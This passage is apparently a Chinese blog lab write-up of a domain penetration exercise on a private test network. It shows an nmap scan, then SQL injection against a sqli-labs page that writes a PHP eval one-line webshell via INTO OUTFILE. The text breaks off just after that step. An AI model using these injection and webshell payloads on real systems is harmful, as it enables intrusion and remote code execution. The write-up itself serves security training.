class="toc-number">1.2.1.</span> <span class="toc-text">* WIN2008(172.16.243.222)：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#getshell%EF%BC%9A"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">-  getshell：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96-webshell%EF%BC%9A"><span class="toc-number">1.2.1.1.1.</span> <span class="toc-text">- sql注入获取 webshell：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3-mysql-5-7-2148%E9%A1%B5-2178"><span class="toc-number">1.2.1.1.2.</span> <span class="toc-text">官方文档 - mysql-5.7 - 2148页(2178)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IPC-getshell%EF%BC%9A"><span class="toc-number">1.2.1.1.3.</span> <span class="toc-text">- $IPC getshell：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#445%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-getshell%EF%BC%9A"><span class="toc-number">1.2.1.1.4.</span> <span class="toc-text">- 445永恒之蓝 getshell：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%87%E7%BA%A7%E5%88%B0-msf-%E5%8F%8D%E5%BC%B9-meterptershell%EF%BC%88%E4%BB%8Ewebshell%EF%BC%89%EF%BC%9A"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">- 升级到 msf 反弹 meterptershell（从webshell）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%9A"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">- 权限提升：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%93%E5%AF%86%E7%A0%81%EF%BC%9A"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">- 抓密码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%88%9D%E6%AD%A5%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.5.</span> <span class="toc-text">- 内网初步扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BD%93%E5%89%8D%E9%9D%B6%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%EF%BC%9A"><span class="toc-number">1.2.1.5.1.</span> <span class="toc-text">- 当前靶机网络配置：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E5%86%85%E7%BD%91%EF%BC%88%E6%8C%82%E4%BB%A3%E7%90%86%EF%BC%89%EF%BC%9A"><span class="toc-number">1.2.1.5.2.</span> <span class="toc-text">- 模拟内网（挂代理）：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%EF%BC%9A"><span class="toc-number">1.2.1.5.3.</span> <span class="toc-text">- 常见端口扫描：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%EF%BC%9A"><span class="toc-number">1.2.1.6.</span> <span class="toc-text">- 远程登陆：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WIN2012-172-16-243-221-%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">* WIN2012(172.16.243.221)：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#getshell%EF%BC%9A-1"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">- getshell：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#IPC-getshell%EF%BC%9A-1"><span class="toc-number">1.2.2.1.1.</span> <span class="toc-text">- $IPC getshell：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#445%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-getshell%EF%BC%9A-1"><span class="toc-number">1.2.2.1.2.</span> <span class="toc-text">- 445永恒之蓝 getshell：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#gt-%E8%8E%B7%E5%8F%96-cmdshell%EF%BC%9A"><span class="toc-number">1.2.2.1.3.</span> <span class="toc-text">&gt; 获取 cmdshell：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#gt-%E8%8E%B7%E5%8F%96-meterpretershell%EF%BC%9A"><span class="toc-number">1.2.2.1.4.</span> <span class="toc-text">&gt; 获取 meterpretershell：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%9A-1"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">- 权限提升：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%93%E5%AF%86%E7%A0%81%EF%BC%9A-1"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">- 抓密码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%EF%BC%9A-1"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">- 远程登陆：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%A7%E7%BB%AD%E6%8A%93%E5%AF%86%E7%A0%81%EF%BC%9A"><span class="toc-number">1.2.2.4.1.</span> <span class="toc-text">- 继续抓密码：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WIN7-172-16-243-223-%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">* WIN7(172.16.243.223)：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#getshell%EF%BC%9A-2"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">- getshell：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#IPC-getshell%EF%BC%9A-2"><span class="toc-number">1.2.3.1.1.</span> <span class="toc-text">- $IPC getshell：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#gt-%E8%8E%B7%E5%8F%96-cmdshell%EF%BC%9A-1"><span class="toc-number">1.2.3.1.2.</span> <span class="toc-text">&gt; 获取 cmdshell：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#gt-%E8%8E%B7%E5%8F%96-meterpretershell%EF%BC%9A-1"><span class="toc-number">1.2.3.1.3.</span> <span class="toc-text">&gt; 获取 meterpretershell：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#445%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-getshell%EF%BC%9A-2"><span class="toc-number">1.2.3.1.4.</span> <span class="toc-text">- 445永恒之蓝 getshell：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#gt-%E8%8E%B7%E5%8F%96-cmdshell%EF%BC%9A-2"><span class="toc-number">1.2.3.1.5.</span> <span class="toc-text">&gt; 获取 cmdshell：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#gt-%E8%8E%B7%E5%8F%96-meterpretershell%EF%BC%9A-2"><span class="toc-number">1.2.3.1.6.</span> <span class="toc-text">&gt; 获取 meterpretershell：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%9A-2"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">- 权限提升：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%93%E5%AF%86%E7%A0%81%EF%BC%9A-2"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">- 抓密码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%EF%BC%9A"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">- 远程登录：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%A7%E7%BB%AD%E6%8A%93%E5%AF%86%E7%A0%81%EF%BC%9A-1"><span class="toc-number">1.2.3.4.1.</span> <span class="toc-text">- 继续抓密码：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%9C%80%E5%90%8E%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">三、最后总结：</span></a></li></ol></li></ol></div></div></div><div class="tag-cloud"><div class="tag-cloud-tags"><a href="/tags/CRYPTO/" style="font-size: 18px; color: #668eb3">CRYPTO</a> <a href="/tags/CTF/" style="font-size: 24px; color: #3383cd">CTF</a> <a href="/tags/MISC/" style="font-size: 15px; color: #8094a6">MISC</a> <a href="/tags/PHP/" style="font-size: 12px; color: #999">PHP</a> <a href="/tags/Python/" style="font-size: 12px; color: #999">Python</a> <a href="/tags/WEB/" style="font-size: 27px; color: #1a7eda">WEB</a> <a href="/tags/%E5%90%AC%E5%90%8E%E6%84%9F/" style="font-size: 18px; color: #668eb3">听后感</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 12px; color: #999">域渗透</a> <a href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/" style="font-size: 12px; color: #999">备忘录</a> <a href="/tags/%E5%A4%A7%E5%AE%B6%E5%A5%BD/" style="font-size: 12px; color: #999">大家好</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 30px; color: #0078e7">安全</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 18px; color: #668eb3">工具</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 12px; color: #999">杂项</a> <a href="/tags/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0%E8%80%8C%E5%B7%B2/" style="font-size: 12px; color: #999">测试文章而已</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 21px; color: #4d89c0">渗透</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 21px; color: #4d89c0">随笔</a> <a href="/tags/%E9%9D%9E%E9%A2%84%E6%9C%9F/" style="font-size: 12px; color: #999">非预期</a></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://morblog.cc/posts/14199/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Morouu"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Morouu的大狗窝 ●'◡'●"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">还行的第1次域渗透</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">Posted on</span> <time title="Created: 2021-03-07 18:34:54" itemprop="dateCreated datePublished" datetime="2021-03-07T18:34:54+08:00">2021-03-07</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="Word count in article">9.1k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="Reading time">45m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">渗透训练</span></a></span> > <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83/%E7%AC%AC1%E6%AC%A1/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">第1次</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">安全</span></a><a class="tag" href="/tags/%E6%B8%97%E9%80%8F/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">渗透</span></a><a class="tag" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">域渗透</span></a></span></div><div class="post-author"><div class="author-avatar"><img src="https://www.gravatar.com/avatar/78b1c437d72cc247eeac098553bbf4a6?s=20&amp;d=https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FYunYouJun%2Fcdn%2Fimg%2Favatar%2Fnone.jpg"></div><span class="author-name">morouu</span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><p>​    <em>过自己想要的生活，上帝会让你付出代价，但最后，这个完整的自己，就是上帝还给你的利息。不如就稍微地学以致用把老师给的环境玩意过一遍？</em></p>
+<span id="more"></span>
+
+<h1 id="还行的域渗透WP"><a href="#还行的域渗透WP" class="headerlink" title="还行的域渗透WP"></a>还行的域渗透WP</h1><hr>
+<h2 id="一、目标配置（假装在内网）："><a href="#一、目标配置（假装在内网）：" class="headerlink" title="一、目标配置（假装在内网）："></a>一、目标配置（假装在内网）：</h2><h4 id="攻击机："><a href="#攻击机：" class="headerlink" title="- 攻击机："></a>- 攻击机：</h4><ul>
+<li>KALI(msf6)：172.16.243.100</li>
+<li>WIN7：172.16.243.101</li>
+<li>KALI(msf5)：172.16.243.102</li>
+</ul>
+<h4 id="靶机："><a href="#靶机：" class="headerlink" title="- 靶机："></a>- 靶机：</h4><ul>
+<li>WIN7：172.16.243.223</li>
+<li>WIN2008：172.16.243.222 （入口机）</li>
+<li>WIN12：172.16.243.221</li>
+</ul>
+<hr>
+<h2 id="二、具体步骤："><a href="#二、具体步骤：" class="headerlink" title="二、具体步骤："></a>二、具体步骤：</h2><h3 id="WIN2008-172-16-243-222-："><a href="#WIN2008-172-16-243-222-：" class="headerlink" title="* WIN2008(172.16.243.222)："></a>* WIN2008(172.16.243.222)：</h3><h4 id="getshell："><a href="#getshell：" class="headerlink" title="-  getshell："></a>-  getshell：</h4><p>还是先进行最基本的 <strong>端口扫描</strong> 趴，</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">nmap -O -A -sV -p- <span class="token number">172.16</span>.243.222</code></pre>
+
+<p>得到结果：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># nmap -O -A -sV -p- 172.16.243.222                                                                        130 ⨯</span>
+Starting Nmap <span class="token number">7.91</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2021</span>-03-04 <span class="token number">20</span>:08 EST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">172.16</span>.243.222
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00066s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65516</span> filtered ports
+PORT      STATE SERVICE      VERSION
+<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain       Microsoft DNS <span class="token number">6.1</span>.7601 <span class="token punctuation">(</span>1DB1446A<span class="token punctuation">)</span> <span class="token punctuation">(</span>Windows Server <span class="token number">2008</span> R2 SP1<span class="token punctuation">)</span>
+<span class="token operator">|</span> dns-nsid: 
+<span class="token operator">|</span>_  bind.version: Microsoft DNS <span class="token number">6.1</span>.7601 <span class="token punctuation">(</span>1DB1446A<span class="token punctuation">)</span>
+<span class="token number">80</span>/tcp    <span class="token function">open</span>  http         Apache httpd <span class="token number">2.4</span>.10 <span class="token punctuation">((</span>Win32<span class="token punctuation">)</span> OpenSSL/0.9.8zb PHP/5.3.29<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-generator: FreeMind-XSL Stylesheet <span class="token punctuation">(</span>see: http://freemind-xsl.dev.slash-me.net/ <span class="token keyword">for</span> details<span class="token punctuation">)</span>
+<span class="token operator">|</span> http-methods: 
+<span class="token operator">|</span>_  Potentially risky methods: TRACE
+<span class="token operator">|</span>_http-server-header: Apache/2.4.10 <span class="token punctuation">(</span>Win32<span class="token punctuation">)</span> OpenSSL/0.9.8zb PHP/5.3.29
+<span class="token operator">|</span>_http-title: SQL Injections
+<span class="token number">88</span>/tcp    <span class="token function">open</span>  kerberos-sec Microsoft Windows Kerberos <span class="token punctuation">(</span>server time: <span class="token number">2021</span>-03-05 01:10:07Z<span class="token punctuation">)</span>
+<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc        Microsoft Windows RPC
+<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn  Microsoft Windows netbios-ssn
+<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap         Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: pentest.com, Site: Default-First-Site-Name<span class="token punctuation">)</span>
+<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds Windows Server <span class="token number">2008</span> R2 Enterprise <span class="token number">7601</span> Service Pack <span class="token number">1</span> microsoft-ds <span class="token punctuation">(</span>workgroup: PENTEST<span class="token punctuation">)</span>
+<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5?
+<span class="token number">593</span>/tcp   <span class="token function">open</span>  ncacn_http   Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
+<span class="token number">636</span>/tcp   <span class="token function">open</span>  tcpwrapped
+<span class="token number">3268</span>/tcp  <span class="token function">open</span>  ldap         Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: pentest.com, Site: Default-First-Site-Name<span class="token punctuation">)</span>
+<span class="token number">3269</span>/tcp  <span class="token function">open</span>  tcpwrapped
+<span class="token number">5722</span>/tcp  <span class="token function">open</span>  msrpc        Microsoft Windows RPC
+<span class="token number">9389</span>/tcp  <span class="token function">open</span>  mc-nmf       .NET Message Framing
+<span class="token number">49154</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
+<span class="token number">49155</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
+<span class="token number">49157</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
+<span class="token number">49158</span>/tcp <span class="token function">open</span>  ncacn_http   Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
+<span class="token number">49168</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
+MAC Address: 00:0C:29:78:9E:96 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
+Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
+Device type: general purpose<span class="token operator">|</span>specialized<span class="token operator">|</span>phone
+Running: Microsoft Windows <span class="token number">2008</span><span class="token operator">|</span><span class="token number">8.1</span><span class="token operator">|</span><span class="token number">7</span><span class="token operator">|</span>Phone<span class="token operator">|</span>Vista
+OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
+OS details: Microsoft Windows Server <span class="token number">2008</span> R2 or Windows <span class="token number">8.1</span>, Microsoft Windows <span class="token number">7</span> Professional or Windows <span class="token number">8</span>, Microsoft Windows Embedded Standard <span class="token number">7</span>, Microsoft Windows Phone <span class="token number">7.5</span> or <span class="token number">8.0</span>, Microsoft Windows Vista SP0 or SP1, Windows Server <span class="token number">2008</span> SP1, or Windows <span class="token number">7</span>, Microsoft Windows Vista SP2, Windows <span class="token number">7</span> SP1, or Windows Server <span class="token number">2008</span>
+Network Distance: <span class="token number">1</span> hop
+Service Info: Host: WIN-QJ9CO8DHNTS<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+<span class="token operator">|</span>_clock-skew: mean: -2h39m59s, deviation: 4h37m07s, median: 0s
+<span class="token operator">|</span>_nbstat: NetBIOS name: WIN-QJ9CO8DHNTS, NetBIOS user: <span class="token operator">&lt;</span>unknown<span class="token operator">></span>, NetBIOS MAC: 00:0c:29:78:9e:96 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
+<span class="token operator">|</span> smb-os-discovery: 
+<span class="token operator">|</span>   OS: Windows Server <span class="token number">2008</span> R2 Enterprise <span class="token number">7601</span> Service Pack <span class="token number">1</span> <span class="token punctuation">(</span>Windows Server <span class="token number">2008</span> R2 Enterprise <span class="token number">6.1</span><span class="token punctuation">)</span>
+<span class="token operator">|</span>   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+<span class="token operator">|</span>   Computer name: WIN-QJ9CO8DHNTS
+<span class="token operator">|</span>   NetBIOS computer name: WIN-QJ9CO8DHNTS<span class="token punctuation">\</span>x00
+<span class="token operator">|</span>   Domain name: pentest.com
+<span class="token operator">|</span>   Forest name: pentest.com
+<span class="token operator">|</span>   FQDN: WIN-QJ9CO8DHNTS.pentest.com
+<span class="token operator">|</span>_  System time: <span class="token number">2021</span>-03-05T09:10:58+08:00
+<span class="token operator">|</span> smb-security-mode: 
+<span class="token operator">|</span>   account_used: guest
+<span class="token operator">|</span>   authentication_level: user
+<span class="token operator">|</span>   challenge_response: supported
+<span class="token operator">|</span>_  message_signing: required
+<span class="token operator">|</span> smb2-security-mode: 
+<span class="token operator">|</span>   <span class="token number">2.02</span>: 
+<span class="token operator">|</span>_    Message signing enabled and required
+<span class="token operator">|</span> smb2-time: 
+<span class="token operator">|</span>   date: <span class="token number">2021</span>-03-05T01:10:59
+<span class="token operator">|</span>_  start_date: <span class="token number">2020</span>-10-20T10:07:05
+
+TRACEROUTE
+HOP RTT     ADDRESS
+<span class="token number">1</span>   <span class="token number">0.66</span> ms <span class="token number">172.16</span>.243.222
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">216.78</span> seconds</code></pre>
+
+<p>可以看到开了不少的端口，其中 <code>80</code> ， <code>135/139</code> ， <code>445</code> 不妨先从 <strong>web</strong> ，<strong>IPC(太怪了)</strong> 或者 <strong>SMB</strong> 入手？</p>
+<h5 id="sql注入获取-webshell："><a href="#sql注入获取-webshell：" class="headerlink" title="- sql注入获取 webshell："></a>- sql注入获取 webshell：</h5><p>这里先从 <code>80</code> 端口入手吧，打开一看竟然会是 <strong>sqli-lib</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305111513.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305111513725" loading="lazy"></p>
+</blockquote>
+<p>众所周知，这是一个 <strong>windows</strong> 的服务器，在 <strong>mysql</strong> 的版本小于等于 <strong>5.7.16</strong> 时默认是 <strong>空</strong> 的，即写入文件是无限制的。那么列一下 <strong>常见默认路径</strong> 趴：</p>
+<p><strong>常见默认路径</strong></p>
+<ul>
+<li><strong>winserver</strong> 的 <strong>iis</strong> 默认路径 <strong>C:\Inetpub\wwwroot</strong></li>
+<li><strong>linux</strong> 的 <ul>
+<li><strong>nginx</strong> 一般是 <strong>/usr/local/nginx/html</strong>，**/home/wwwroot/default<strong>，</strong>/usr/share/nginx<strong>，</strong>/var/www/html**等：</li>
+<li><strong>apache</strong> 一般是 <strong>/var/www/html</strong>，**/var/www/html/htdocs**</li>
+</ul>
+</li>
+<li><strong>phpstudy</strong> 一般是 <strong>\PhpStudy[版本号]]\PHPTutorial\WWW</strong></li>
+<li><strong>xammp</strong> 一般是 <strong>\xampp\htdocs</strong></li>
+</ul>
+<p>然后从第 <strong>1</strong> 关通过回显注入来查看 <strong>version()</strong> 、 <strong>@@secure_file_priv</strong> 、 <strong>@@basedir</strong>  以及  <strong>@@datadir</strong> 来分别对应查看 <strong>数据库版本</strong> 、 <strong>可写文件目录</strong> 、 <strong>mysql安装路径</strong> 以及 <strong>mysql数据库文件路径</strong> 。</p>
+<ul>
+<li><p>查看 <strong>数据库版本</strong> 和 <strong>可写文件目录</strong> ：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token number">172.16</span><span class="token number">.243</span><span class="token number">.222</span><span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' union select <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>@@secure_file_priv<span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span></code></pre>
+
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305092708.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305092708700" loading="lazy"></p>
+</blockquote>
+</li>
+</ul>
+<p>显而易见，数据库版本为 <strong>5.5.40</strong> 是 xxxx的，因而 <strong>@@secure_file_priv</strong> 是为 <strong>空</strong> ，即写入文件无限制。</p>
+<ul>
+<li><p>查看 <strong>mysql安装路径</strong> 和 <strong>mysql数据库文件路径</strong> ：</p>
+<pre class="language-python" data-language="python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">172.16</span><span class="token number">.243</span><span class="token number">.222</span><span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>20union<span class="token operator">%</span>20select<span class="token operator">%</span><span class="token number">201</span><span class="token punctuation">,</span>@@basedir<span class="token punctuation">,</span>@@datadir<span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span></code></pre>
+
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305092915.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305092915540" loading="lazy"></p>
+</blockquote>
+</li>
+</ul>
+<p>emmm，居然是 <strong>phpstudy</strong> ， 然后 <strong>mysql安装路径</strong> 和 <strong>myql数据库文件路径</strong> 就得到了，那么该是拿 <strong>webshell</strong> 趴。 </p>
+<p>这个就比较简单了，直接写入 <strong>webshell</strong> 文件即可。不过现在并不知道当前页面的 <strong>本地路径</strong> 是啥，好在这个靶机是存在 <strong>phpinfo.php</strong> 的，可以直接通过这个页面查看当前 <strong>本地路径</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210305113041.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210305113041316" loading="lazy"></p>
+</blockquote>
+<p>显然，路径为 <strong>C:/WWW/phpinfo.php</strong> 了，那么来到第 <strong>7</strong> 关，把 <strong>[一句话]</strong> 写进去趴。</p>
+<pre class="language-python" data-language="python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">172.16</span><span class="token number">.243</span><span class="token number">.222</span><span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">7</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>20union<span class="token operator">%</span>20select<span class="token operator">%</span><span class="token number">201</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3C</span>?php<span class="token operator">%</span>20eval<span class="token punctuation">(</span>$_REQUEST<span class="token punctuation">[</span><span class="token operator">%</span>27dm<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">%</span><span class="token number">3E</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>20into<span class="token operator">%</span>20outfile<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">27C</span><span class="token punctuation">:</span><span class="token operator">/</span>WWW<span class="token operator">/</span>dm<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span></code></pre>
+
+<p>顺带说一下关于 <strong>into outfile</strong> 和 <strong>into dumpfile</strong> 的却别吧：</p>
